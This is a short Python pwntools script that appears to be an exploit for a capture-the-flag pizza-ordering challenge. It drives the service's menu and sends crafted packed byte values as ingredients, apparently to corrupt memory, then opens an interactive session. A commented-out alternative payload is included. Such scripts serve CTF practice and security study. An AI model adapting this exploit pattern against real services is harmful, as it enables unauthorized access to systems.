from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
def new(name):
  s.recvuntil('Choice:')
  s.sendline('N')
  s.recvuntil('?')
  s.sendline(name)
def order_pizza(pizza):
  s.recvuntil('Choice:')
  s.sendline('O')
  s.recvuntil('?')
  s.sendline(str(len(pizza)))
  for incre in pizza:
    s.recvuntil('?')
    s.sendline(str(len(incre)))
    for dat in incre:
      s.recvuntil(':')
      s.sendline(dat)
def leave():
  s.recvuntil('Choice:')
  s.sendline('L')
def cook_pizza(dat):
  s.recvuntil('Choice:')
  s.sendline('C')
  s.recvuntil(':')
  s.sendline(dat)
def login(dat):
  s.recvuntil('Choice:')
  s.sendline("L")
  s.recvuntil('?')
  s.sendline(dat)
new('woojin')
order_pizza([[p32(0x858d9ff0),p32(0x909ff000)]])
cook_pizza('1234')
'''
new("ASDASDASDASDSADASDASD")
order_pizza([[p32(0x9ff09ff0),p32(0x80858d8d)]]) # 0x8d8d9ff0
cook_pizza("C"*0x27)
'''
s.interactive()

